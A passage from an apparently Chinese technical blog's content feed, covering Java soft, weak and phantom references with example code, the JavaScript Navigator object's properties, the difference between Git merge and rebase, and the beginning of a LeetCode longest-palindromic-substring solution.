ReferenceQueue&lt;&gt;();</span><br><span class="line">String str &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">SoftReference&lt;String&gt; softReference &#x3D; new SoftReference&lt;&gt;(str, referenceQueue);</span><br><span class="line"></span><br><span class="line">str &#x3D; null;</span><br><span class="line">&#x2F;&#x2F; Notify GC</span><br><span class="line">System.gc();</span><br><span class="line"></span><br><span class="line">System.out.println(softReference.get()); &#x2F;&#x2F; abc</span><br><span class="line"></span><br><span class="line">Reference&lt;? extends String&gt; reference &#x3D; referenceQueue.poll();</span><br><span class="line">System.out.println(reference); &#x2F;&#x2F;null</span><br></pre></td></tr></table></figure><p><code>注意：软引用对象是在jvm内存不够的时候才会被回收，我们调用System.gc()方法只是起通知作用，JVM什么时候扫描回收对象是JVM自己的状态决定的。就算扫描到软引用对象也不一定会回收它，只有内存不够的时候才会回收。</code></p><p>当内存不足时，JVM首先将软引用中的对象引用置为null，然后通知垃圾回收器进行回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(JVM内存不足) &#123;</span><br><span class="line">    &#x2F;&#x2F; 将软引用中的对象引用置为null</span><br><span class="line">    str &#x3D; null;</span><br><span class="line">    &#x2F;&#x2F; 通知垃圾回收器进行回收</span><br><span class="line">    System.gc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，垃圾收集线程会在虚拟机抛出OutOfMemoryError之前回收软引用对象，而且虚拟机会尽可能优先回收长时间闲置不用的软引用对象。对那些刚构建的或刚使用过的**”较新的”软对象会被虚拟机尽可能保留<strong>，这就是引入引用队列ReferenceQueue的原因。<br>**应用场景：</strong><br>浏览器的后退按钮。按后退时，这个后退时显示的网页内容是重新进行请求还是从缓存中取出呢？这就要看具体的实现策略了。</p><ol><li>如果一个网页在浏览结束时就进行内容的回收，则按后退查看前面浏览过的页面时，需要重新构建；</li><li>如果将浏览过的网页存储到内存中会造成内存的大量浪费，甚至会造成内存溢出。</li></ol><p>这时候就可以使用软引用，很好的解决了实际的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取浏览器对象进行浏览</span><br><span class="line">Browser browser &#x3D; new Browser();</span><br><span class="line">&#x2F;&#x2F; 从后台程序加载浏览页面</span><br><span class="line">BrowserPage page &#x3D; browser.getPage();</span><br><span class="line">&#x2F;&#x2F; 将浏览完毕的页面置为软引用</span><br><span class="line">SoftReference softReference &#x3D; new SoftReference(page);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 回退或者再次浏览此页面时</span><br><span class="line">if(softReference.get() !&#x3D; null) &#123;</span><br><span class="line">    &#x2F;&#x2F; 内存充足，还没有被回收器回收，直接获取缓存</span><br><span class="line">    page &#x3D; softReference.get();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; 内存不足，软引用的对象已经回收</span><br><span class="line">    page &#x3D; browser.getPage();</span><br><span class="line">    &#x2F;&#x2F; 重新构建软引用</span><br><span class="line">    softReference &#x3D; new SoftReference(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-弱引用-WeakReference"><a href="#3-弱引用-WeakReference" class="headerlink" title="3. 弱引用(WeakReference)"></a>3. 弱引用(WeakReference)</h4><p>弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程，因此不一定会很快发现那些只具有弱引用的对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">WeakReference&lt;String&gt; weakReference &#x3D; new WeakReference&lt;&gt;(str);</span><br><span class="line">str &#x3D; null;</span><br></pre></td></tr></table></figure><p>JVM首先将软引用中的对象引用置为null，然后通知垃圾回收器进行回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; null;</span><br><span class="line">System.gc();</span><br></pre></td></tr></table></figure><p><code>注意：如果一个对象是偶尔(很少)的使用，并且希望在使用时随时就能获取到，但又不想影响此对象的垃圾收集，那么你应该用Weak Reference来记住此对象。</code></p><p>下面的代码会让一个弱引用再次变为一个强引用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String str &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">WeakReference&lt;String&gt; weakReference &#x3D; new WeakReference&lt;&gt;(str);</span><br><span class="line">&#x2F;&#x2F; 弱引用转强引用</span><br><span class="line">String strongReference &#x3D; weakReference.get();</span><br></pre></td></tr></table></figure><p>同样，弱引用可以和一个引用队列(ReferenceQueue)联合使用，如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p><p><strong>简单测试:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GCTarget.java</span><br><span class="line">public class GCTarget &#123;</span><br><span class="line">    &#x2F;&#x2F; 对象的ID</span><br><span class="line">    public String id;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 占用内存空间</span><br><span class="line">    byte[] buffer &#x3D; new byte[1024];</span><br><span class="line"></span><br><span class="line">    public GCTarget(String id) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void finalize() throws Throwable &#123;</span><br><span class="line">        &#x2F;&#x2F; 执行垃圾回收时打印显示对象ID</span><br><span class="line">        System.out.println(&quot;Finalizing GCTarget, id is : &quot; + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCTargetWeakReference.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class GCTargetWeakReference extends WeakReference&lt;GCTarget&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F; 弱引用的ID</span><br><span class="line">    public String id;</span><br><span class="line"></span><br><span class="line">    public GCTargetWeakReference(GCTarget gcTarget,</span><br><span class="line">              ReferenceQueue&lt;? super GCTarget&gt; queue) &#123;</span><br><span class="line">        super(gcTarget, queue);</span><br><span class="line">        this.id &#x3D; gcTarget.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void finalize() &#123;</span><br><span class="line">        System.out.println(&quot;Finalizing GCTargetWeakReference &quot; + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WeakReferenceTest.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public class WeakReferenceTest &#123;</span><br><span class="line">    &#x2F;&#x2F; 弱引用队列</span><br><span class="line">    private final static ReferenceQueue&lt;GCTarget&gt; REFERENCE_QUEUE &#x3D; new ReferenceQueue&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        LinkedList&lt;GCTargetWeakReference&gt; gcTargetList &#x3D; new LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 创建弱引用的对象，依次加入链表中</span><br><span class="line">        for (int i &#x3D; 0; i &lt; 5; i++) &#123;</span><br><span class="line">            GCTarget gcTarget &#x3D; new GCTarget(String.valueOf(i));</span><br><span class="line">            GCTargetWeakReference weakReference &#x3D; new GCTargetWeakReference(gcTarget,</span><br><span class="line">                REFERENCE_QUEUE);</span><br><span class="line">            gcTargetList.add(weakReference);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;Just created GCTargetWeakReference obj: &quot; +</span><br><span class="line">                gcTargetList.getLast());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 通知GC进行垃圾回收</span><br><span class="line">        System.gc();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 休息几分钟，等待上面的垃圾回收线程运行完成</span><br><span class="line">            Thread.sleep(6000);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 检查关联的引用队列是否为空</span><br><span class="line">        Reference&lt;? extends GCTarget&gt; reference;</span><br><span class="line">        while((reference &#x3D; REFERENCE_QUEUE.poll()) !&#x3D; null) &#123;</span><br><span class="line">            if(reference instanceof GCTargetWeakReference) &#123;</span><br><span class="line">                System.out.println(&quot;In queue, id is: &quot; +</span><br><span class="line">                    ((GCTargetWeakReference) (reference)).id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行WeakReferenceTest.java，运行结果如下：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-6e044732044d1170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可见WeakReference对象的生命周期基本由垃圾回收器决定，一旦垃圾回收线程发现了弱引用对象，在下一次GC过程中就会对其进行回收。</p><h4 id="4-虚引用-PhantomReference"><a href="#4-虚引用-PhantomReference" class="headerlink" title="4. 虚引用(PhantomReference)"></a>4. 虚引用(PhantomReference)</h4><p>虚引用顾名思义，就是形同虚设。与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收器回收。<br><strong>应用场景：</strong><br>虚引用主要用来跟踪对象被垃圾回收器回收的活动。<br>虚引用与软引用和弱引用的一个区别在于：</p><p><code>虚引用必须和引用队列(ReferenceQueue)联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String str &#x3D; new String(&quot;abc&quot;);</span><br><span class="line">ReferenceQueue queue &#x3D; new ReferenceQueue();</span><br><span class="line">&#x2F;&#x2F; 创建虚引用，要求必须与一个引用队列关联</span><br><span class="line">PhantomReference pr &#x3D; new PhantomReference(str, queue);</span><br></pre></td></tr></table></figure><p>程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要进行垃圾回收。如果程序发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Java中4种引用的级别和强度由高到低依次为：强引用 -&gt; 软引用 -&gt; 弱引用 -&gt; 虚引用</p><p>当垃圾回收器回收时，某些对象会被回收，某些不会被回收。垃圾回收器会从根对象Object来标记存活的对象，然后将某些不可达的对象和一些引用的对象进行回收。<br>通过表格来说明一下，如下：</p><table><thead><tr><th>引用类型</th><th>被垃圾回收时间</th><th>用途</th><th>生存时间</th></tr></thead><tbody><tr><td>强引用</td><td>从来不会</td><td>对象的一般状态</td><td>JVM停止运行时终止</td></tr><tr><td>软引用</td><td>当内存不足时</td><td>对象缓存</td><td>内存不足时终止</td></tr><tr><td>弱引用</td><td>正常垃圾回收时</td><td>对象缓存</td><td>垃圾回收后终止</td></tr><tr><td>虚引用</td><td>正常垃圾回收时</td><td>跟踪对象的垃圾回收</td><td>垃圾回收后终止</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Navigator 简介</title>
      <link href="/2021/07/02/Navigator-%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/07/02/Navigator-%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://blog.csdn.net/justflyhigh/article/details/7604200">javascript Navigator 对象介绍</a></p><h1 id="Navigator-对象"><a href="#Navigator-对象" class="headerlink" title="Navigator 对象"></a>Navigator 对象</h1><p>Navigator 对象包含有关浏览器的信息，没有应用于 navigator 对象的公开标准，不过所有浏览器都支持该对象，它的实例是唯一的，可以用 Window 对象的 navigator 属性来引用它.<br>更加详细的介绍查看MDN官方文档：<a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator">Navigator</a></p><h1 id="Navigator-对象属性"><a href="#Navigator-对象属性" class="headerlink" title="Navigator 对象属性"></a>Navigator 对象属性</h1><h4 id="appCodeName"><a href="#appCodeName" class="headerlink" title="appCodeName"></a>appCodeName</h4><p>是一个只读字符串，声明了浏览器的代码名，在所有以 Netscape 代码为基础的浏览器中，它的值是 “Mozilla”，为了兼容起见，在 Microsoft 的浏览器中，它的值也是 “Mozilla”<br>    语法：navigator.appCodeName;<br>    实例：document.write(navigator.appCodeName); //输出 Mozilla</p><h4 id="appName"><a href="#appName" class="headerlink" title="appName"></a>appName</h4><p>是一个只读到字符串，声明了浏览器的名称，在基于 Netscape 的浏览器中，这个属性的值是 “Netscape”，在 IE 中，这个属性的值是 “Microsoft Internet Explorer”，其他浏览器可以正确地表示自己或者伪装成其他的浏览器以达到兼容性<br>    语法：navigator.appName;<br>    实例：document.write(navigator.appName); //输出 Netscape</p><h4 id="appVersion"><a href="#appVersion" class="headerlink" title="appVersion"></a>appVersion</h4><p>返回浏览器的平台和版本信息。该属性是一个只读的字符串，该字符串的第一部分是版本号，把该字符串传递给 parseInt() 只能获取主版本号，该属性的其余部分提供了有关浏览器版本的其他细节，包括运行它的操作系统的信息<br>    语法：navigator.appVersion;<br>    实例：document.write(navigator.appVersion); //输出 5.0 (X11)</p><h4 id="cookieEnabled"><a href="#cookieEnabled" class="headerlink" title="cookieEnabled"></a>cookieEnabled</h4><p>返回一个布尔值，如果浏览器启用了 cookie，该属性值为 true，如果禁用了 cookie，则值为 false<br>    语法：navigator.cookieEnabled;<br>    实例：document.write(navigator.cookieEnabled); //输出 true</p><h4 id="onLine"><a href="#onLine" class="headerlink" title="onLine"></a>onLine</h4><p>是一个只读的布尔值，声明了系统是否处于脱机模式，在 IE 4+ 中，用户可以在浏览器中选择脱机工作的状态，当脱机工作被选后，系统就进入了脱机状态，内容将从缓存进行读取<br>    语法：navigator.onLine;<br>    实例：document.write(navigator.onLine); //输出 true</p><h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><p>是一个只读的字符串，声明了运行浏览器的操作系统和（或）硬件平台，虽然该属性没有标准的值集合，但它有些常用值，比如 “Win32”、”MacPPC” 以及 “Linuxi586”，等等<br>    语法：navigator.platform;<br>    实例：document.write(navigator.platform); //输出 Linux i686</p><h4 id="userAgent"><a href="#userAgent" class="headerlink" title="userAgent"></a>userAgent</h4><p>是一个只读的字符串，声明了浏览器用于 HTTP 请求的用户代理头的值，一般来讲，它是在 navigator.appCodeName 的值之后加上斜线和 navigator.appVersion 的值构成的，例如：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322<br>    语法：navigator.userAgent;<br>    实例：document.write(navigator.userAgent); //输出 Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20100101 Firefox/7.0.1</p><h4 id="Navigator-对象方法"><a href="#Navigator-对象方法" class="headerlink" title="Navigator 对象方法"></a>Navigator 对象方法</h4><p>javaEnabled()返回一个布尔值，该值指示浏览器是否支持并启用了 Java，如果是，则返回 true，否则返回 false<br>    语法：navigator.javaEnabled();<br>    实例：document.write(navigator.javaEnabled()); //输出 true</p>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git rebase 与mege 的区别</title>
      <link href="/2021/07/02/Git-rebase-%E4%B8%8Emege-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2021/07/02/Git-rebase-%E4%B8%8Emege-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://betterprogramming.pub/differences-between-git-merge-and-rebase-and-why-you-should-care-ae41d96237b6">Differences Between Git Merge and Rebase — and Why You Should Care</a></p><p>无论你的项目使用哪种分支策略，在分支之间集成代码更改都是几乎每天都需要做的事情。 使用 git 有两个主要选项，要么merge，要么rebase。<br>在本文中，将说明并强调两个选项之间的差异，并指出执行操作时需要注意的事项。<br>首先，将使用动画单独完成这两个操作，并在最后进行并排比较。 如果你已经熟悉这些操作的工作原理，可以直接跳到比较部分。</p><p>阅读官方 Git 手册，它指出 rebase “reapplies commits on top of another base branch”，而合并“joins two or more development histories together”。 换句话说，merge 和 rebase 之间的主要区别在于，merge 保留了发生的历史，而 rebase 重写了它。 在我们仔细研究它们各自的内部运作以了解这真正意味着什么之前，让我们从一个例子开始。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f70423c017137973.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>查看上面的示例，我们看到开发人员 Ada 和 Satoshi 最初创建了两个主题分支（feature-1 和 feature-2），源于主分支上的同一个提交（C1）。 然后，Ada 通过将其合并到 master（创建合并提交 C4）来完成 feature-1。 Satoshi 现在有两个选项可以将 Ada 的更改集成到他的分支特性 2 中——merge或rebase。</p><h1 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h1><p>让我们从最常见的集成变更工作流程开始：merge。 在 Satoshi 准备将 Ada 的更改merge到 feature-2 之前，他必须首先更新他的本地master分支，因为它目前落后。 一旦 master 和 o/master 同步，Satoshi就准备将所有内容merge到他的主题分支中。<br>看看这个 30 秒的动画说明了这个过程：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-8de4d88ded589823.gif?imageMogr2/auto-orient/strip" alt="anotherMerge2.gif"><br>将所有更改merge Feature 2 后，Satoshi 现在可以继续开发分支，并在完成时将其merge回 master 来完成它。<br>下面是merge操作的最终结果。 开发历史原样保留，仅添加了 C7。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a70b08f38fedd932.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h1><p>熟悉了基本的merge工作流程，是时候从 rebase 的角度来看相同的示例了。 就像在merge的情况下一样，在Satoshi开始整合更改之前，他必须首先确保他的本地和远程master分支同步。 但是，Satoshi 可以使用 rebase 集成所有更改，从而“重写历史”，而不是进行常规merge“保留发生的历史”。<br>通过将 feature-2 重新rebase到 master Git 上，C5 和 C6 的提交将一个一个地倒回并重新应用到 C4 上，使其看起来像 feature-2 最初是从 Ada 已完成更改的尖端分支出来的。<br>观看30 秒动画了解实际过程：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2844851e2bc77d5c.gif?imageMogr2/auto-orient/strip" alt="rebase.gif"></p><p>再次整合所有更改后，Satoshi 准备继续在他的主题分支上工作。<br>下面是 rebase 操作的最终结果。 注意提交 C5 和 C6 是如何直接重新应用到 C4 上的，重写开发历史并完全删除旧提交！<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2fbf208fae86837e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>现在我们知道了merge和rebase的不同之处，是时候更详细地比较这两种结果了。</p><h1 id="Merge-和-Rebase的不同"><a href="#Merge-和-Rebase的不同" class="headerlink" title="Merge 和 Rebase的不同"></a>Merge 和 Rebase的不同</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-974d4a3d06498666.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>正如我们在上面看到的，mege操作通过创建一个新的单一merge提交 (C7) 将分支交织在一起，导致菱形非线性历史——基本上保留发生的历史。 通过将这个结果与 rebase 操作的结果进行比较，我们看到没有创建合并提交，相反，两个提交 C5 和 C6 只是简单地倒回并直接重新应用到 C4 之上，保持历史线性。 如果我们进一步检查两次重新应用的提交，我们可以看到哈希值发生了变化，这表明 rebase 确实重写了历史记录。</p><p><code>注意：每当重新rebase分支时，即使内容可能仍然相同，也将始终生成新的提交！ 因此，之前的提交最终会从历史记录中完全删除。</code></p><h1 id="力量越大责任越大"><a href="#力量越大责任越大" class="headerlink" title="力量越大责任越大"></a>力量越大责任越大</h1><p>我们已经看到 rebase 是如何重写历史的，而 merge 是如何保留它的。 但这在更广泛的意义上意味着什么？ 这两种操作有哪些可能性和潜在缺点？</p><h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>例如，假设您、在尝试集成更改时遇到了一些令人讨厌的冲突。 在合并场景中，只需要解决一次冲突，直接在 C7 提交中。 另一方面，使用 rebase，您可能会被迫在每次提交（C5 和 C6）中解决类似的冲突，因为它们被重新应用。<br>如果冲突不是那么容易解决，这可能表明你和你的同事沟通不足，因为你们处理相同文件的时间太长了。</p><h3 id="已发布的分支"><a href="#已发布的分支" class="headerlink" title="已发布的分支"></a>已发布的分支</h3><p>另一个与 rebase 相关的潜在问题发生在你正在 rebase 的分支已经远程发布，并且其他人已经基于它的工作。 然后，你rebase的分支可能会给所有相关方带来严重的混乱和头痛，因为 Git 会告诉你你的分支同时领先和落后。 如果发生这种情况，使用 rebase 标志 (git pull –rebase) 拉取远程更改通常可以解决问题。<br>此外，每当你rebase一个已经发布的分支时，无论是否没有其他人基于它工作，你仍然需要强制push它以将你的更新发送到远程服务器——完全覆盖现有的远程引用。</p><h3 id="数据丢失-to-your-advantage"><a href="#数据丢失-to-your-advantage" class="headerlink" title="数据丢失 (to your advantage)"></a>数据丢失 (to your advantage)</h3><p>后，由于 rebase 重写历史而merge保留它，因此在 rebase 时实际上可能会丢失数据。 当重新应用新的提交时，旧的提交（最终，垃圾回收后）被删除。 事实上，这个特性正是 rebase 如此强大的原因——它允许你在公开之前整理你的开发历史！ 通过交互式 rebase（即将发表的文章的主题），你可以例如删除不需要的提交、将更改压缩在一起，或者只是更新提交消息。</p><h3 id="Rebase-的经验法则"><a href="#Rebase-的经验法则" class="headerlink" title="Rebase 的经验法则"></a>Rebase 的经验法则</h3><p>为了避免与 rebase 相关的最常见问题，建议遵守以下规则：</p><ol><li>不要 rebase 远程发布的分支……</li><li>……除非你知道你是唯一一个在做这件事的人（并且觉得十分安全可靠）<br>3。 在Rebase之前，从你要rebase的分支的顶端创建一个备份分支，因为它可以让您轻松比较结果（一旦完成）并在必要时跳回rebase前的状态。</li></ol><h3 id="更加高级的rebase-用法"><a href="#更加高级的rebase-用法" class="headerlink" title="更加高级的rebase 用法"></a>更加高级的rebase 用法</h3><p>有很多更高级的 rebase 用例，它们都超出了本文的范围，但将作为后续文章的一部分。 如前所述，更突出的功能之一是交互式 rebase，它允许你自定义每个提交应如何重新应用。<br>此模式可用于拆分提交、将提交压缩在一起、重新排序提交，甚至完全删除提交，仅举几例。</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>许多开发人员倾向于只使用merge而不是 rebase，通常带有“至少我知道我不会丢失任何工作”的心理。 从某种意义上说，不使用不习惯使用的工具是一种可靠的方法。 即使你知道有更强大的功能但是不学习不利用，也不是一个好办法。<br>这有点像说，“我知道我有这辆很棒的车，但我更喜欢坚持第一档，因为我知道速度会致命”，而不是学习如何换档并在更高的速度下安全地旅行。<br>根据我的经验，学习如何使用 rebase 尤其可以加深你对 Git 的理解，并总体上提高你作为集成开发人员的水平——尤其是在源代码管理方面！<br>最后，我在职业生涯早期从一位高级开发人员那里得到的最好的建议之一是：“放弃Source Tree 中各种按钮的使用，而是学习如何从终端使用 Git 命令！ 否则，你将永远无法获得使用 Git 的全部好处，而且你以后将无法编写任何自动化pipeline的脚本。”</p>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 最长回文子串</title>
      <link href="/2021/07/02/LeetCode-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/"/>
      <url>/2021/07/02/LeetCode-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>转自<a href="https://www.cxyxiaowu.com/2869.html">LeetCode 第 5 题：最长回文子串（超详细的解法！！！）</a></p><p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入: &quot;cbbd&quot;</span><br><span class="line">输出: &quot;bb&quot;</span><br></pre></td></tr></table></figure><h1 id="方法一：暴力匹配-（Brute-Force）"><a href="#方法一：暴力匹配-（Brute-Force）" class="headerlink" title="方法一：暴力匹配 （Brute Force）"></a>方法一：暴力匹配 （Brute Force）</h1><p>根据回文子串的定义，枚举所有长度大于等于2 的子串，依次判断它们是否是回文。在具体实现时，可以只针对大于“当前得到的最长回文子串长度”的子串进行“回文验证”。<br><strong>参考代码1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;www.cxyxiaowu.com</span><br><span class="line">public class Solution &#123;</span><br><span class="line"></span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &lt; 2) &#123;</span><br><span class="line">            return s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int maxLen &#x3D; 1;</span><br><span class="line">        String res &#x3D; s.substring(0, 1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 枚举所有长度大于等于 2 的子串</span><br><span class="line">        for (int i &#x3D; 0; i &lt; len - 1; i++) &#123;</span><br><span class="line">            for (int j &#x3D; i + 1; j &lt; len; j++) &#123;</span><br><span class="line">                if (j - i + 1 &gt; maxLen &amp;&amp; valid(s, i, j)) &#123;</span><br><span class="line">                    maxLen &#x3D; j - i + 1;</span><br><span class="line">                    res &#x3D; s.substring(i, j + 1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 